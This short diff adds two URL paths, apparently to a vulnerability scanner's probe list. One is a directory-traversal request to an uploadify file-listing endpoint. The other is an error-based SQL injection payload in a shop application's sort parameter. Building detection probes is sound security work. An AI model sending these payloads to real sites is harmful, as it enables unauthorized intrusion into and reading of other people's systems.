@@ -1,0 +1,2 @@
+/index.php/Home/uploadify/fileList?type=.+&path=../../../
+/index.php/Mobile/Goods/goodsList/id/1/sort_asc/desc,extractvalue(1,concat(0x7e,(select%20md5(1)),0x7e))
